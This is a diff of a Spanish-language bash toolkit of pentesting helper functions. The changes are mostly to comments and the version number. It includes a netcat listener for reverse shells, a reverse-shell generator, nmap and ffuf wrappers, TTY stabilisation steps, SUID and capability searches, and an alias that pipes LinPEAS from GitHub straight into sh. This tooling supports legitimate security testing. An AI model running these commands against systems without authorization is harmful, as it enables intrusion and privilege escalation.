@@ -5,17 +5,19 @@
 # |  \| || |__   | |__   |  \| | | \  / |
 # | . ` ||  __|  |  __|  | . ` | | |\/| |
 # | |\  || |____ | |____ | |\  | | |  | |
-# |_| \_||______||______||_| \_| |_|  |_|
+# |_| \_||______||______||_| \_||_|  |_|
 #
-# ARSENAL DE NEENAH v3.0 - KIT DE OPERACIONES PARA LINUX
+# ARSENAL DE NEENAH v3.1 - KIT DE OPERACIONES PARA LINUX
+# Herramientas de shell optimizadas para pentesting en sistemas Linux.
 #
 
 # ===================================================================
-# 1. UTILIDADES GENERALES (NAVAJA SUIZA)
+# 1. UTILIDADES GENERALES (COMPARTIDAS)
 # ===================================================================
 
 # Inicia un servidor web simple en el directorio actual.
-# Uso: serve (usa el puerto 8000) o serve <puerto>
+# Útil para servir archivos a la máquina objetivo.
+# Uso: serve [puerto] (por defecto 8000)
 serve() {
     local port="${1:-8000}"
     echo -e "[\e[92m+\e[0m] Sirviendo archivos en http://0.0.0.0:$port ..."
@@ -23,7 +25,8 @@ serve() {
 }
 
 # Inicia un listener de Netcat verboso en un puerto.
-# Uso: listen <puerto> (por defecto usa 443)
+# Útil para recibir reverse shells o conexiones.
+# Uso: listen [puerto] (por defecto 443)
 listen() {
     local port="${1:-443}"
     echo -e "[\e[92m+\e[0m] Escuchando en el puerto $port..."
@@ -31,7 +34,8 @@ listen() {
 }
 
 # Copia la IP de la interfaz tun0 (o la especificada) al portapapeles.
-# Uso: tunip (para tun0) o tunip <interfaz>
+# Útil para copiar rápidamente tu IP de VPN.
+# Uso: tunip [interfaz] (por defecto tun0)
 tunip() {
     local iface="${1:-tun0}"
     local ip=$(ip -4 addr show "$iface" 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
@@ -48,30 +52,31 @@ tunip() {
 # 2. RECONOCIMIENTO Y FUZZING WEB
 # ===================================================================
 
-# Escáner Nmap versátil que organiza los resultados.
-# Uso: scan <IP> [argumentos_de_nmap]
+# Escáner Nmap versátil que organiza los resultados en una carpeta con la IP.
+# Uso: scan <IP> [argumentos_nmap_adicionales]
+# Ejemplo: scan 10.10.10.10 -p- -sV -oA full_scan
 scan() {
     if [ $# -eq 0 ]; then
-        echo "[i] Uso: scan <IP> [argumentos_nmap]"
+        echo "[i] Uso: scan <IP> [argumentos_nmap_adicionales]"
         return 1
     fi
     local target=$1; shift;
     mkdir -p "$target/nmap"; 
     echo -e "[\e[92m+\e[0m] Lanzando escaneo Nmap contra $target..."
     sudo nmap -sC -sV -T4 --min-rate 5000 -v -oN "$target/nmap/scan.nmap" "$target" "$@";
-    echo -e "[\e[92m+\e[0m] Escaneo guardado en $target/nmap/scan.nmap"
+    echo -e "[\e[92m+\e[0m] Escaneo guardado en $target/nmap/scan.nmap";
 }
 
-# Fuzzer web versátil con ffuf.
-# Uso: fuzz <URL> [argumentos_ffuf]
-# Ejemplo Directorio: fuzz http://<IP>/FUZZ
-# Ejemplo VHost: fuzz -H 'Host: FUZZ.<dominio>' http://<IP>
+# Fuzzer web versátil con ffuf. Detecta automáticamente el tipo de wordlist.
+# Uso: fuzz <URL_CON_FUZZ_O_HEADER> [argumentos_ffuf_adicionales]
+# Ejemplos:
+#   Directorio: fuzz http://<IP>/FUZZ
+#   VHost: fuzz -H 'Host: FUZZ.<dominio>' http://<IP>
 fuzz() {
     if [ $# -eq 0 ]; then
-        echo "[i] Uso: fuzz <URL_CON_FUZZ_O_HEADER> [argumentos_ffuf]"
+        echo "[i] Uso: fuzz <URL_CON_FUZZ_O_HEADER> [argumentos_ffuf_adicionales]"
         return 1
     fi
-    # Selecciona la wordlist automáticamente basado en si FUZZ está en la URL o en una cabecera
     local wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
     if [[ "$*" == *"-H"* && "$*" == *"FUZZ"* ]]; then
         wordlist="/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"
@@ -87,8 +92,8 @@ fuzz() {
 # 3. ACCESO Y GESTIÓN DE SHELLS
 # ===================================================================
 
-# Generador de Reverse Shells para copiar y pegar.
-# Uso: revshell <tipo> <ip> <puerto>
+# Genera y copia al portapapeles una reverse shell para diferentes tipos de shell.
+# Uso: revshell <tipo> <ip_atacante> <puerto_listener>
 # Tipos soportados: bash, python, nc
 revshell() {
     local type=$1; local ip=$2; local port=$3; local payload="";
@@ -102,34 +107,37 @@ revshell() {
     echo -e "[\e[92m+\e[0m] Reverse shell de [\e[96m$type\e[0m] para $ip:$port copiada al portapapeles."
 }
 
-# Estabilización de una TTY básica.
-# Copia el comando PTY al portapapeles y muestra los pasos manuales.
+# Estabiliza una TTY básica. Copia el comando PTY al portapapeles y muestra los pasos manuales.
+# Útil para obtener una shell interactiva completa.
 stabilize() {
     local cmd="python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
     echo "$cmd" | xclip -sel clip
-    echo -e "[\e[92m+\e[0m] Comando PTY copiado. Después de ejecutarlo, recuerda la secuencia:"
-    echo -e "  1. Pulsa \e[96mCtrl+Z\e[0m"
-    echo -e "  2. Escribe en tu terminal: \e[96mstty raw -echo; fg\e[0m y pulsa Enter"
+    echo -e "[\e[92m+\e[0m] Comando PTY copiado. Después de ejecutarlo en la shell remota, recuerda la secuencia:"
+    echo -e "  1. Pulsa \e[96mCtrl+Z\e[0m (para suspender la shell)"
+    echo -e "  2. En tu terminal local, escribe: \e[96mstty raw -echo; fg\e[0m y pulsa Enter"
     echo -e "  3. En la shell remota, escribe \e[96mreset\e[0m y pulsa Enter"
     echo -e "  4. Configura el terminal: \e[96mexport TERM=xterm\e[0m"
 }
 
 
 # ===================================================================
-# 4. POST-EXPLOTACIÓN Y ESCALADA (LINUX)
+# 4. POST-EXPLOTACIÓN Y ESCALADA DE PRIVILEGIOS (LINUX)
 # ===================================================================
 
 # Descarga y ejecuta LinPEAS en memoria para enumeración de Linux.
+# Útil para identificar posibles vectores de escalada de privilegios.
 # Uso: enumlinux
 alias enumlinux="echo '[+] Lanzando LinPEAS desde memoria...'; curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh"
 
-# Busca binarios con permisos SUID y SGID.
+# Busca binarios con permisos SUID y SGID en el sistema.
+# Útil para encontrar programas que se ejecutan con privilegios elevados.
 # Uso: findsuid
 alias findsuid='echo "[+] Buscando binarios SUID/SGID..."; find / -type f -perm -6000 -ls 2>/dev/null'
 
 # Busca binarios con capabilities de Linux.
+# Útil para identificar programas con permisos especiales que pueden ser explotados.
 # Uso: findcaps
 alias findcaps='echo "[+] Buscando capabilities..."; /usr/sbin/getcap -r / 2>/dev/null'
 
 
-echo -e "\n[\e[92m+\e[0m] Arsenal de Neenah v3.0 (Linux Edition) cargado. Herramientas listas para operar."
+echo -e "\n[\e[92m+\e[0m] Arsenal de Neenah v3.1 (Linux Edition) cargado. ¡Herramientas listas para operar!"
